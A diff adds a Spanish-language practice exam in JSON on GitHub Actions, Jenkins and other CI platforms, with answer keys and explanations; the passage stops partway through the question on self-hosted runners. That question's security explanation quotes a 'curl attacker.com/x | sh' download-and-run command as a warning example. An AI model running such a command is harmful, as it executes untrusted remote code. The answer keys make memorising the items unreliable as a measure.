@@ -1,0 +1,419 @@
+{
+  "id": "devops-sim-04-github-actions-and-jenkins",
+  "trackId": "devops",
+  "order": 4,
+  "title": "Simulacro 04 — GitHub Actions, Jenkins y CI platforms",
+  "focus": "GitHub Actions (workflows, jobs, steps, matrix, secrets, environments). Jenkins pipelines (declarative vs scripted). GitLab CI, CircleCI. Caching. Parallel jobs. Reusable workflows. Artifact passing. Cuándo usar cuál.",
+  "areaCoverage": ["vcs-ci"],
+  "timeLimitMin": 30,
+  "passThreshold": 0.75,
+  "questions": [
+    {
+      "id": "q1",
+      "areaId": "vcs-ci",
+      "topic": "GitHub Actions básicos",
+      "difficulty": "junior",
+      "scenario": "Un dev jr abre .github/workflows/ci.yml y ve keywords: on, jobs, steps, uses, run. No entiende la jerarquía.",
+      "question": "¿Cuál es la jerarquía correcta de un GitHub Actions workflow?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "Workflow (archivo YAML) → Jobs (paralelos por default) → Steps (secuenciales dentro del job). Cada Step ejecuta 'uses' (una action pre-built del marketplace) o 'run' (un comando shell). Los Jobs corren en runners (Ubuntu/Windows/macOS VMs), aislados entre sí a menos que declares dependencies con 'needs'.", "correct": true, "why": "Correcto. Esta es la anatomía canónica. Workflow → Jobs → Steps. Jobs paralelos por default (para speed). Steps siempre secuenciales dentro del job (para orden). needs: para dependencies entre jobs." },
+        { "letter": "B", "text": "Workflow → Steps → Jobs → Actions.", "correct": false, "why": "Falso — Jobs contienen Steps, no al revés. Y 'Actions' no es un nivel de la jerarquía; es lo que un step ejecuta." },
+        { "letter": "C", "text": "Jobs → Workflows → Steps.", "correct": false, "why": "Falso — el workflow es el contenedor top-level. Jobs viven dentro del workflow." },
+        { "letter": "D", "text": "Solo hay un nivel: comandos shell.", "correct": false, "why": "Falso — hay estructura jerárquica. Sin niveles sería solo un script bash." }
+      ],
+      "explanation": "Workflow YAML structure típico:\n```\nname: CI\non: [push, pull_request]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with: { node-version: 20 }\n      - run: npm ci\n      - run: npm test\n```\n\nElementos: (1) 'name' — display name. (2) 'on' — trigger events (push, pull_request, schedule, workflow_dispatch, etc.). (3) 'jobs' — map de jobs con nombres. (4) 'runs-on' — tipo de runner (ubuntu-latest, windows-latest, macos-latest, self-hosted). (5) 'steps' — array secuencial. Cada step: 'uses' (action reutilizable) o 'run' (shell command). 'with' pasa inputs a la action. 'env' setea env vars.\n\nJobs en paralelo por default. Si job B depende de A: 'needs: [build]' en B. B espera A verde antes de correr.\n\nRunners: (a) GitHub-hosted — VMs preconfiguradas, free tier generoso para OSS, paid para private. (b) Self-hosted — tu propia infra (útil para GPU, ARM, private network). Runners self-hosted requieren security care — código malicioso en PR de fork puede ejecutarse.",
+      "realWorld": "GitHub Actions lanzó Nov 2019. Actualmente >55% de OSS repos con CI activo usan GHA (State of Software Engineering 2023). Marketplace tiene 20k+ actions. Netflix, Shopify, Airbnb usan GHA para varios workflows.",
+      "tags": ["github actions", "workflows", "jobs", "steps"],
+      "tech": ["GitHub Actions"],
+      "references": [{ "title": "GitHub Docs — Understanding GitHub Actions" }]
+    },
+    {
+      "id": "q2",
+      "areaId": "vcs-ci",
+      "topic": "Jenkins vs GitHub Actions",
+      "difficulty": "junior",
+      "scenario": "Tu equipo debate: migrar de Jenkins a GitHub Actions. Un ingeniero dice 'Jenkins es más viejo pero más powerful'. Otro dice 'GHA es más simple'.",
+      "question": "¿Cuáles son las diferencias fundamentales entre Jenkins y GitHub Actions?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "Jenkins: self-hosted (tú mantienes el server), configuración via Jenkinsfile (Groovy DSL) o UI, plugin ecosystem masivo (1800+), muy flexible. Requires ops effort (mantener JVM, updates, backups). GitHub Actions: managed (GitHub corre los runners, aunque puedes self-host), configuración via YAML, integración nativa con GitHub, marketplace de actions. Menos ops burden pero menos flexible que Jenkins.", "correct": true, "why": "Correcto. Tradeoff clásico: flexibility (Jenkins) vs simplicity + integration (GHA). Jenkins ha dominado enterprise por 15 años; GHA es el 'moderno' desde 2019, ganando share rápidamente." },
+        { "letter": "B", "text": "Jenkins y GHA son idénticos.", "correct": false, "why": "Falso — diferentes en modelo (self vs managed), config (Groovy vs YAML), ecosystem (plugins vs actions)." },
+        { "letter": "C", "text": "Jenkins es cloud-only.", "correct": false, "why": "Inverso — Jenkins es tradicionalmente self-hosted. Cloud Jenkins (CloudBees) existe pero es la excepción." },
+        { "letter": "D", "text": "GitHub Actions no soporta pipelines complejos.", "correct": false, "why": "Falso — GHA soporta workflows complejos con reusable workflows, matrix, environments, approvals. Más simple que Jenkins pero no limited." }
+      ],
+      "explanation": "Comparación detallada:\n\nJenkins (2011, Kohsuke Kawaguchi): (1) Java Server. (2) Master + agents architecture. (3) Configuración: Jenkinsfile (Groovy DSL, declarativa o scripted), o UI 'freestyle' (legacy). (4) Plugins: >1800, casi cualquier integración imaginable. (5) Muy flexible pero: setup complexity, mantener Java, plugin conflicts, security patches constantes.\n\nGitHub Actions (2019): (1) SaaS managed by GitHub. (2) Ephemeral runners (nuevo VM por job). (3) YAML declarativo. (4) Marketplace de actions (20k+). (5) Nativa integración con GitHub (permissions, environments, secrets). (6) Menos flexible en workflows super custom.\n\nGitLab CI (2015): similar a GHA en YAML pero también self-hosted option (con GitLab). Merge trains + dashboards muy powerful.\n\nCircleCI (2011): SaaS orb ecosystem (~like actions). Excellent performance. Popular en startups.\n\nCuándo Jenkins: (a) Legacy — inversión existente. (b) Muy custom workflows imposibles en GHA. (c) Muy air-gapped enterprise. (d) Necesitas plugins específicos sin equivalente. (e) Control absoluto over infra.\n\nCuándo GHA: (a) Ya usas GitHub. (b) Priorizar simplicity y integration. (c) Menos ops. (d) Marketplace tiene lo que necesitas.\n\nMigration Jenkins → GHA: converters existen (jenkins-to-github-actions, ChatGPT-assisted). Usually requires rework — no todo Jenkinsfile mapea 1:1.",
+      "realWorld": "En 2023, State of DevOps report: GHA es #1 en repos OSS, Jenkins aún #1 en enterprise legacy. Netflix migrated de Jenkins a Spinnaker + custom (Netflix has always been custom-heavy). Shopify uses Buildkite (alternative). Google internal uses Blaze. Uber uses Jenkins + Kubernetes. LinkedIn uses Bazel + custom pipelines.",
+      "tags": ["jenkins", "github actions", "ci comparison"],
+      "tech": ["Jenkins", "GitHub Actions"],
+      "references": [{ "title": "Jenkins Docs" }, { "title": "GitHub Docs — GitHub Actions" }]
+    },
+    {
+      "id": "q3",
+      "areaId": "vcs-ci",
+      "topic": "Triggers en GitHub Actions",
+      "difficulty": "mid",
+      "scenario": "Necesitas: (1) correr CI en cada push a main; (2) correr tests en PR abiertas; (3) deploy nightly a las 2AM; (4) deploy manual con botón; (5) trigger al pushear un tag v*.",
+      "question": "¿Qué triggers ('on:') de GitHub Actions cubren estos casos?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "(1) 'on: push: branches: [main]'; (2) 'on: pull_request'; (3) 'on: schedule: cron: 0 2 * * *' (UTC!); (4) 'on: workflow_dispatch' (activa botón 'Run workflow'); (5) 'on: push: tags: [v*]'. También hay: workflow_call (reusable), workflow_run (encadenar workflows), issues, release, y más.", "correct": true, "why": "Correcto. GHA triggers exhaustivos. Cron en UTC — un gotcha común, alguien programa '2 AM' pensando local, ejecuta 2 AM UTC (que puede ser 6 PM local). Múltiples triggers por workflow OK: 'on: [push, pull_request]'." },
+        { "letter": "B", "text": "Los triggers son fijos y no personalizables.", "correct": false, "why": "Falso — GHA tiene ~30 event types diferentes. Muy flexible." },
+        { "letter": "C", "text": "Todos los workflows corren solo en push.", "correct": false, "why": "Falso — múltiples triggers disponibles: schedule, workflow_dispatch, pull_request, release, etc." },
+        { "letter": "D", "text": "Cron no está soportado en GHA.", "correct": false, "why": "Falso — 'on: schedule: cron' es soportado. Note: cron en repos public sin activity pausa después de 60 días." }
+      ],
+      "explanation": "Triggers comunes: (1) push — commits pushed. Puede filter por branches, tags, paths. Path filter útil para monorepo (correr solo si cambió el directorio del servicio). (2) pull_request — PR abierta/synced/reopened. Puede filter por branches target, tipos. (3) schedule — cron. UTC only. Cuidado: cron unreliable a veces (delay hasta 30min si GH busy). (4) workflow_dispatch — manual trigger. Puede tener 'inputs' que el user llena (env, region, version). (5) workflow_call — reusable workflow, callable desde otros. (6) workflow_run — cuando otro workflow completa. (7) release — cuando GitHub release creado. (8) issues, issue_comment — para bots.\n\nPath filters (mono/multirepo):\n```\non:\n  push:\n    paths:\n      - 'services/api/**'\n      - '!services/api/docs/**'\n```\nSolo runs si cambia código de api/ (no docs).\n\nBranch/tag patterns: glob syntax. 'v*' matches v1.0, v2.5.1. 'release/*' matches release/*.\n\nAcción en fork PR: por security, GHA limita el token permissions en PRs de forks. workflows que necesitan secrets no corren (pull_request_target existe pero es peligrosos si mal usado — corre código del fork con token del repo target).\n\nConcurrency:\n```\nconcurrency:\n  group: deploy-${{ github.ref }}\n  cancel-in-progress: true\n```\nEvita 2 deploys concurrentes al mismo branch.",
+      "realWorld": "GitHub Actions cron scheduling documentado con caveats — high load times may cause delays. Public repos sin activity: cron pauses after 60 days for cost. Enterprise plans have more reliable cron. Path filters usadas heavily en monorepos con múltiples services (ej. Airbnb Nx repo).",
+      "tags": ["triggers", "cron", "workflow_dispatch"],
+      "tech": ["GitHub Actions"],
+      "references": [{ "title": "GitHub Docs — Events that trigger workflows" }]
+    },
+    {
+      "id": "q4",
+      "areaId": "vcs-ci",
+      "topic": "Jenkins declarative vs scripted",
+      "difficulty": "mid",
+      "scenario": "Un Jenkinsfile puede ser 'declarative' (con 'pipeline { }') o 'scripted' (con 'node { }' + Groovy libre). ¿Cuál usar?",
+      "question": "¿Cuál es la diferencia entre Jenkins declarative y scripted pipelines?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "Declarative: estructura fija ('pipeline { agent { }, stages { stage('X') { steps { } } } }'), más restrictiva pero más legible, editor validation, mejor para 80% de casos. Scripted: Groovy libre ('node { stage(...) { ... } }'), Turing-complete, más flexible, útil para lógica compleja. Recomendación oficial de Jenkins: usar declarative por default, scripted solo si necesitas.", "correct": true, "why": "Correcto. Declarative es la evolución (2017, Jenkins 2.5+). Diseñado para ser más accesible. Scripted es el legado — más powerful pero más error-prone, harder debug." },
+        { "letter": "B", "text": "Son idénticos.", "correct": false, "why": "Falso — sintaxis y capacidades diferentes. Declarative es limited on purpose para simplicity." },
+        { "letter": "C", "text": "Solo scripted funciona en producción.", "correct": false, "why": "Falso — declarative es production-grade y preferido." },
+        { "letter": "D", "text": "Declarative no soporta parámetros.", "correct": false, "why": "Falso — declarative soporta 'parameters { }' block, environment {}, options {}, when {} conditions, y más." }
+      ],
+      "explanation": "Declarative example:\n```groovy\npipeline {\n  agent { docker { image 'node:20' } }\n  stages {\n    stage('Test') {\n      steps { sh 'npm test' }\n    }\n    stage('Deploy') {\n      when { branch 'main' }\n      steps { sh './deploy.sh' }\n    }\n  }\n  post { failure { mail to: 'team@x.com' } }\n}\n```\n\nScripted example:\n```groovy\nnode('linux') {\n  stage('Test') {\n    checkout scm\n    sh 'npm test'\n  }\n  if (env.BRANCH_NAME == 'main') {\n    stage('Deploy') { sh './deploy.sh' }\n  }\n}\n```\n\nDeclarative features: (a) 'agent' — where to run. (b) 'stages' — sequential. (c) 'steps' — inside stage. (d) 'when' — conditional stage. (e) 'post' — always/success/failure/etc. (f) 'options' — retry, timeout. (g) 'environment' — env vars. (h) 'parameters' — inputs.\n\nEscape hatch: 'script { }' block dentro de declarative permite Groovy libre para lógica compleja. Usar sparingly — hint de refactor.\n\nShared libraries: extract common logic. En src/, vars/. Import con '@Library'. Enables 'as-code' pipeline patterns across teams.\n\nBlue Ocean UI: visualiza pipelines declaratives mejor que scripted. Motivador para migrar.\n\nAnti-patrones: (1) Massive scripted Jenkinsfile — 2000 lines Groovy. Fix: shared libraries + declarative. (2) Logic outside pipeline in Jenkins UI (hidden config). Fix: move to Jenkinsfile. (3) No agent specified — uses master (bad practice, master reserved for orchestration).",
+      "realWorld": "Jenkins 2 (2016) introduced Pipeline as Code + Jenkinsfile. Declarative added en 2017. Most Jenkins tutorials post-2018 default to declarative. CloudBees (Jenkins commercial) preaches declarative. Legacy Jenkinsfiles pre-2017 are usually scripted.",
+      "tags": ["jenkins", "declarative", "scripted", "pipelines"],
+      "tech": ["Jenkins"],
+      "references": [{ "title": "Jenkins Docs — Pipeline Syntax" }]
+    },
+    {
+      "id": "q5",
+      "areaId": "vcs-ci",
+      "topic": "Matrix strategy",
+      "difficulty": "mid",
+      "scenario": "Tu librería debe soportar Node 18/20/22 en Ubuntu/macOS/Windows. Actualmente corres solo Node 20 en Ubuntu. Un Windows user reporta bugs.",
+      "question": "¿Cómo se implementa matrix strategy en GHA?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "'strategy: matrix:' con arrays por dimensión. Ejemplo: 'node: [18, 20, 22]', 'os: [ubuntu-latest, macos-latest, windows-latest]' = 9 jobs paralelos (producto cartesiano). Puede excluir combinaciones específicas con 'exclude', incluir extras con 'include'. Usar '${{ matrix.node }}' y '${{ matrix.os }}' en steps.", "correct": true, "why": "Correcto. Sintaxis GHA para matrix. Genera todas combinaciones. Excluir combos que no aplican (ej. Node 18 + macos-arm64 no supported)." },
+        { "letter": "B", "text": "Crear 9 workflows separados manualmente.", "correct": false, "why": "Anti-DRY. Matrix precisamente evita duplicación manual." },
+        { "letter": "C", "text": "Matrix requiere paid GitHub plan.", "correct": false, "why": "Falso — matrix disponible en free tier. Los minutos de compute sí tienen limits pero matrix como feature es gratis." },
+        { "letter": "D", "text": "Solo se puede matrix por 1 dimensión.", "correct": false, "why": "Falso — matrix es N-dimensional. Producto cartesiano de todas dimensiones." }
+      ],
+      "explanation": "Ejemplo GHA matrix:\n```yaml\njobs:\n  test:\n    strategy:\n      matrix:\n        node: [18, 20, 22]\n        os: [ubuntu-latest, macos-latest, windows-latest]\n        exclude:\n          - node: 18\n            os: macos-latest\n        include:\n          - node: 20\n            os: ubuntu-latest\n            experimental: true\n      fail-fast: false\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: actions/setup-node@v4\n        with: { node-version: ${{ matrix.node }} }\n      - run: npm test\n```\n\nfail-fast (default true): si un matrix job falla, cancela los demás. Útil para speed pero puede ocultar bugs específicos a un OS. Set 'false' para run all para diagnosis.\n\nmax-parallel: limit concurrent jobs. Default: all parallel. Útil si tienes muchos runners limitados.\n\nContinue-on-error: por matrix element. Setear 'true' para experimental combos.\n\nMatrix dinámico: generar matrix desde otro job. Job A outputs matrix JSON, Job B uses '${{ needs.A.outputs.matrix }}' en strategy.\n\nCost consideration: 9-way matrix = 9x cost. En OSS free, no cost. En private, 9x minutes. Consider matrices reduced (test todas combos en main, subset en PRs).",
+      "realWorld": "Node.js core CI: matrix de 5 OS × 6 arch. React usa matrix reducido en PRs, full en main. Rust project matrix stable/beta/nightly × ubuntu/mac/windows. Kubernetes usa matrix para K8s versions.",
+      "tags": ["matrix", "cross-platform", "parallel"],
+      "tech": ["GitHub Actions"],
+      "references": [{ "title": "GitHub Docs — Using a matrix for your jobs" }]
+    },
+    {
+      "id": "q6",
+      "areaId": "vcs-ci",
+      "topic": "Secrets y environments",
+      "difficulty": "mid",
+      "scenario": "Tienes secrets diferentes por ambiente: dev, staging, prod. Prod requiere approval de un manager antes de deployar.",
+      "question": "¿Qué son GitHub Actions environments y cómo se usan?",
+      "multiSelect": true,
+      "options": [
+        { "letter": "A", "text": "Environments: agrupan configuración por deployment target (dev, staging, prod). Cada environment tiene: secrets propios, variables, protection rules (required reviewers, wait timer, branch restrictions). Se referencia en job con 'environment: prod'. Job pauses esperando approval si environment requiere.", "correct": true, "why": "Correcto. Feature esencial de GHA para production deployments. Elegante — todo el approval flow declarativo en el workflow." },
+        { "letter": "B", "text": "Required reviewers: lista de users/teams que deben aprobar antes que el job corra. UI para aprobar/rechazar. Approval logged en audit trail — quien aprobó cuándo. Auditability para compliance.", "correct": true, "why": "Correcto. Solución nativa para deploy approvals. Compare con Jenkins que requiere 'input' step + plugin de approval — GHA integrated." },
+        { "letter": "C", "text": "Wait timer: delay entre approval y ejecución. Útil para 'cooling off' period — chance de cancelar. Ejemplo: aprobado a las 3PM, ejecuta a las 3:15PM. 5-30 min común.", "correct": true, "why": "Correcto. Sanidad — humans pueden cambiar de opinión. También útil para batch deploys ('collect approvals de varios deploys, deploy juntos en 15 min')." },
+        { "letter": "D", "text": "Branch restrictions: solo ciertos branches pueden deploy a este environment. Prod puede requerir 'main' o 'release/*' only. Feature branches no.", "correct": true, "why": "Correcto. Previene accidental deploy from feature branch to prod. Security control importante." },
+        { "letter": "E", "text": "Environments son solo para paid plans.", "correct": false, "why": "Parcial — environments para public repos son free. Para private repos, protection rules (approvals, wait timer) requieren GitHub Pro/Team/Enterprise. Los environments básicos son free." }
+      ],
+      "explanation": "Environment config UI: Settings → Environments → New environment. Configure: (1) Required reviewers (up to 6 users/teams). (2) Wait timer (0-43200 min = 30 días max). (3) Deployment branches (all, protected only, custom pattern). (4) Environment secrets. (5) Environment variables.\n\nUso en workflow:\n```yaml\njobs:\n  deploy-prod:\n    runs-on: ubuntu-latest\n    environment:\n      name: production\n      url: https://prod.example.com\n    steps:\n      - run: ./deploy.sh\n        env:\n          API_KEY: ${{ secrets.PROD_API_KEY }}\n```\nCuando job comienza, waits pending approval. UI muestra 'awaiting approval' con botones approve/reject. Approver approves, job proceeds.\n\nSecrets scoping (jerarquía): (1) Environment secrets — solo accesibles cuando job usa ese environment. (2) Repository secrets — cualquier workflow del repo. (3) Organization secrets — todos los repos (con acceso).\n\nCombinar con OIDC: environment + OIDC = federated deploy sin long-lived credentials. Ejemplo: environment prod tiene OIDC role ARN en AWS, job asumes role via JWT token.\n\nAnti-patrones: (1) Prod secrets en repo-level (accessible a cualquier workflow). Fix: environment-scoped. (2) Sin required reviewers en prod. (3) Wait timer 0 en prod (no chance de cancel). (4) Todos los devs son reviewers (approval sin peso).",
+      "realWorld": "GitHub Actions environments (2020) diseñados para production deployment workflows. Widely adopted para deploys serios. Compliance-friendly (audit trail). Antes: workflows con 'manual approval' via issue comments — hackish. Ahora nativo.",
+      "tags": ["environments", "secrets", "approvals"],
+      "tech": ["GitHub Actions"],
+      "references": [{ "title": "GitHub Docs — Using environments for deployment" }]
+    },
+    {
+      "id": "q7",
+      "areaId": "vcs-ci",
+      "topic": "Caching en GHA",
+      "difficulty": "mid",
+      "scenario": "Tu CI tarda 8 minutos instalando dependencies. Un ingeniero senior dice: 'usa actions/cache'.",
+      "question": "¿Cómo funciona actions/cache y cuáles son best practices?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "actions/cache: guarda directorios entre runs. Key = string único identificando el cache (usually hash del lockfile). Cache HIT: restaura el directorio (rápido). Cache MISS: descarga fresh, y al final del job GHA guarda el directorio para futuras runs. Best practice: key basado en hash del lockfile (package-lock.json, poetry.lock) — cambio de deps → nuevo cache. restore-keys: fallback si exact key no match (partial hit).", "correct": true, "why": "Correcto. Modelo estándar. Cache invalidation basada en content del lockfile. GHA also has 'setup-node' with cache option (built-in shortcut)." },
+        { "letter": "B", "text": "actions/cache guarda variables de ambiente.", "correct": false, "why": "Confusión — cache es para DIRECTORIOS/files. Env vars persisten dentro del job (env: block) o entre jobs (outputs)." },
+        { "letter": "C", "text": "Cache es infinito — nunca expira.", "correct": false, "why": "Falso — GHA cache tiene 10GB limit por repo. Caches unused 7 días se borran. Total cache size >10GB → oldest evicted." },
+        { "letter": "D", "text": "actions/cache no funciona con dependencies binarias.", "correct": false, "why": "Falso — funciona con cualquier directorio (node_modules, .m2, .gradle, .cargo, etc.). Binary o text." }
+      ],
+      "explanation": "Ejemplo:\n```yaml\n- uses: actions/cache@v4\n  with:\n    path: ~/.npm\n    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}\n    restore-keys: |\n      ${{ runner.os }}-node-\n- run: npm ci\n```\nHash del lockfile en key. restore-keys fallback: si exact match not found, partial match (útil cuando lockfile cambia ligeramente).\n\nsetup-node built-in cache (shortcut):\n```yaml\n- uses: actions/setup-node@v4\n  with:\n    node-version: 20\n    cache: 'npm'  # o pnpm, yarn\n```\nHandles cache automatically.\n\nCache scope: per repo, per branch. Main branch cache accessible to feature branches (fallback). PR from fork: NO cache access (security).\n\nCache size: 10GB max por repo. LRU eviction. Best practice: cache solo lo necesario (no cachear node_modules si ya cacheás ~/.npm — redundant).\n\nDocker layer cache: para Docker builds, actions/cache no funciona bien. Usar: (a) 'docker/build-push-action' con cache-from/cache-to (usa registry o GHA cache backend). (b) BuildKit inline cache.\n\nCommon gotchas: (1) Cache key demasiado broad (hash del repo entero) — never invalidates. (2) Cache key demasiado narrow (timestamp) — never matches. (3) Cachear node_modules directamente — grande, y npm/pnpm/yarn saben cómo hidratar rápido desde ~/.npm cache. (4) No invalidar cache cuando lockfile no fue commiteado — permite drift.",
+      "realWorld": "GitHub Actions cache anunciado en 2020, transformó CI speed. Antes: workflows self-hosting NPM registry o manual caching. Ahora: cache hit rate típico 60-80%. Turborepo usa GHA cache como backend para remote cache.",
+      "tags": ["cache", "actions/cache", "performance"],
+      "tech": ["GitHub Actions"],
+      "references": [{ "title": "GitHub Docs — Caching dependencies to speed up workflows" }]
+    },
+    {
+      "id": "q8",
+      "areaId": "vcs-ci",
+      "topic": "Reusable workflows",
+      "difficulty": "senior",
+      "scenario": "Tienes 20 repos con workflows casi idénticos. Cuando actualizas security scan, editas 20 workflows. Un ingeniero senior dice: 'usa reusable workflows'.",
+      "question": "¿Qué son reusable workflows en GHA?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "Reusable workflows: workflows definidos con 'on: workflow_call' que otros workflows pueden llamar. Definidos una vez (típicamente en un repo central .github/workflows/), llamados desde otros con 'uses: org/repo/.github/workflows/x.yml@v1'. Aceptan inputs, secrets, outputs. Cambio en central = propaga a todos los callers al bump version. DRY para pipelines.", "correct": true, "why": "Correcto. Feature clave para governance. Netflix, Spotify, Airbnb usan workflow templates centrales. Update security scan en 1 lugar, 500 repos updated." },
+        { "letter": "B", "text": "Reusable workflows son idénticos a composite actions.", "correct": false, "why": "Distintos. Composite actions: bundle de steps, usados dentro de un job. Reusable workflows: workflows completos con jobs propios. Composites más limited pero simpler." },
+        { "letter": "C", "text": "Solo pueden usarse dentro del mismo repo.", "correct": false, "why": "Falso — pueden ser cross-repo con path 'org/repo/.github/workflows/x.yml@ref'. Cross-org con more restrictions." },
+        { "letter": "D", "text": "Requieren self-hosted runners.", "correct": false, "why": "Falso — funcionan con GitHub-hosted runners igual que workflows normales." }
+      ],
+      "explanation": "Definir reusable workflow (en central repo):\n```yaml\n# .github/workflows/security-scan.yml\non:\n  workflow_call:\n    inputs:\n      severity:\n        type: string\n        default: 'high'\n    secrets:\n      SNYK_TOKEN:\n        required: true\n    outputs:\n      vulns_found:\n        value: ${{ jobs.scan.outputs.count }}\n\njobs:\n  scan:\n    runs-on: ubuntu-latest\n    outputs:\n      count: ${{ steps.scan.outputs.count }}\n    steps:\n      - uses: actions/checkout@v4\n      - id: scan\n        run: snyk test --severity=${{ inputs.severity }}\n        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n```\n\nUsar desde otro workflow:\n```yaml\njobs:\n  security:\n    uses: myorg/central-workflows/.github/workflows/security-scan.yml@v1\n    with:\n      severity: 'critical'\n    secrets:\n      SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n```\n\nVersioning: @v1, @main, @sha. Best practice: pin a SHA para security (main puede compromise if reusable repo hacked).\n\nComposite actions (alternativa): actions/composite en .github/actions/ directory. Steps bundle. Usar con 'uses: ./.github/actions/my-action'. Diferencia: composite es dentro de UN job (comparte state), reusable workflow es workflow completo (jobs separados, no comparten runner).\n\nBenefits: (1) DRY. (2) Governance — team central mantiene, teams downstream consumen. (3) Testing centralizado. (4) Audit fácil — 1 lugar para review security concerns.\n\nAnti-patrones: (1) Referenciar @main sin pin — un compromise del central affects all. (2) Reusable con demasiados inputs (over-generalización) → indirection sin valor. (3) No versioning discipline — breaking changes sin bump.",
+      "realWorld": "Reusable workflows launched Nov 2021. Widely adopted en 2022+. Central 'devops platform' teams en enterprises expose reusable workflows para: security scans, deploy templates, release automation. GitHub OSS provee muchos ejemplos en github/actions.",
+      "tags": ["reusable workflows", "composite actions", "DRY"],
+      "tech": ["GitHub Actions"],
+      "references": [{ "title": "GitHub Docs — Reusing workflows" }]
+    },
+    {
+      "id": "q9",
+      "areaId": "vcs-ci",
+      "topic": "Artifact passing entre jobs",
+      "difficulty": "senior",
+      "scenario": "Job A buildea un binary. Job B necesita ese binary para testear. Job C necesita para deployear. Job B y C corren después de A. ¿Cómo pasar el binary?",
+      "question": "¿Cómo pasar artifacts entre jobs en GHA?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "actions/upload-artifact en Job A guarda files en storage temporal GHA. actions/download-artifact en Jobs B, C los baja. Artifacts persisten 90 días default (configurable), accesibles desde UI. Ideal para binaries, test reports, logs. Para pequeños data (env vars, strings), usar 'outputs' en el job.", "correct": true, "why": "Correcto. Artifacts son el mecanismo estándar. Storage separada de cache — artifacts para persistencia entre jobs/workflows, cache para speedup builds. Tamaño hasta 10GB, retention configurable." },
+        { "letter": "B", "text": "Los jobs comparten disco entre sí automáticamente.", "correct": false, "why": "Falso — cada job corre en un runner distinto (aislado). Los files de Job A no son accesibles a Job B directamente." },
+        { "letter": "C", "text": "Solo se puede pasar 1 archivo entre jobs.", "correct": false, "why": "Falso — puedes upload/download directorios enteros, múltiples files." },
+        { "letter": "D", "text": "Los artifacts son gratis en cantidad ilimitada.", "correct": false, "why": "Falso — total storage tiene limit por plan. Free: 500MB. Team: 2GB. Enterprise: 50GB. Retention configurable." }
+      ],
+      "explanation": "Ejemplo:\n```yaml\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make build\n      - uses: actions/upload-artifact@v4\n        with:\n          name: my-binary\n          path: dist/\n          retention-days: 7\n  test:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact@v4\n        with: { name: my-binary, path: dist/ }\n      - run: ./run-tests.sh dist/\n```\n\nArtifacts vs cache: (1) Artifacts — persistencia entre jobs Y workflows. Public en UI (download manual). Retention configurable. (2) Cache — speedup builds. Automatic invalidation por key. Not visible en UI.\n\nJob outputs: para pequeños data. En Job A: 'outputs: version: ${{ steps.x.outputs.version }}'. En Job B: 'needs: A' + '${{ needs.A.outputs.version }}'. Limit ~1MB, string only.\n\nWorkflow outputs (reusable workflows): outputs bubbles up al caller workflow.\n\nUse cases: (a) Build artifact once, deploy from many jobs. (b) Test reports para upload y visualización. (c) Coverage reports. (d) Screenshots de failed E2E tests. (e) SBOM/security scan reports.\n\nCross-workflow: workflow A pasa artifact a workflow B via 'workflow_run' trigger + download-artifact con 'run-id'. Más complejo, pero posible.\n\nSecurity: artifacts uploaded pueden ser downloadeados por anyone con read access al repo. Don't upload secrets. actions/upload-artifact v4 (2024) fixed a bug donde artifacts eran mutable.",
+      "realWorld": "GHA artifacts widely used — build once, deploy múltiple environments es el pattern estándar. En 2024, actions/upload-artifact v4 released with improvements. Retention default 90 days is a good balance — costs limit vs debugging past runs.",
+      "tags": ["artifacts", "job dependencies", "outputs"],
+      "tech": ["GitHub Actions"],
+      "references": [{ "title": "GitHub Docs — Storing workflow data as artifacts" }]
+    },
+    {
+      "id": "q10",
+      "areaId": "vcs-ci",
+      "topic": "Self-hosted runners",
+      "difficulty": "senior",
+      "scenario": "Tu equipo necesita: (a) GPUs para ML tests, (b) acceso a un DB privado dentro del VPN corporate, (c) build sobre ARM64. GitHub-hosted no cubre. Un ingeniero propone self-hosted runners.",
+      "question": "¿Qué son self-hosted runners y cuáles son las security considerations?",
+      "multiSelect": true,
+      "options": [
+        { "letter": "A", "text": "Self-hosted runners: máquinas TUYAS (VMs, físicas, containers) que registran con GHA y ejecutan jobs. Ventajas: hardware custom (GPU, ARM, high memory), acceso a private networks, control sobre software instalado, cost potencialmente lower para high usage.", "correct": true, "why": "Correcto. Solución para casos que GitHub-hosted no cubre. Configuración: instalas runner agent, registras con org/repo, agent polls GHA por jobs." },
+        { "letter": "B", "text": "SECURITY CRÍTICO: NO usar self-hosted en repos PÚBLICOS. Un PR malicioso desde un fork puede ejecutar código en tu runner (con acceso a tu red interna, credentials, etc.). GHA docs específicamente warn. Runners self-hosted solo en repos privados donde controlas quién puede PR.", "correct": true, "why": "Correcto. Uno de los más importantes gotchas de seguridad. Un dev externo abre PR con workflow que hace 'curl attacker.com/x | sh' — se ejecuta en tu runner. Blast radius: entire runner infra." },
+        { "letter": "C", "text": "Ephemeral runners: cada job en un runner FRESCO (nuevo VM/container). Previene contamination entre jobs (Job A no puede leak secrets a Job B). GitHub 'ARC' (Actions Runner Controller) para K8s ephemeral runners. AWS EC2 spot instances scaled by CI demand.", "correct": true, "why": "Correcto. Best practice para self-hosted. Reset state = clean environment. Costo: startup time por job. Managed solutions: RunsOn, Namespace, BuildJet." },
+        { "letter": "D", "text": "Los self-hosted runners pueden correr múltiples jobs simultaneously. Configurable con 'RUNNER_JOB_COUNT' o docker-based scaling. Autoscaling con Terraform + AWS EC2 o K8s deployments.", "correct": true, "why": "Correcto. Un runner puede correr paralelo (limitado por CPU/memory). Escalamiento horizontal por más runners registered. ARC scala K8s pods based on queue depth." },
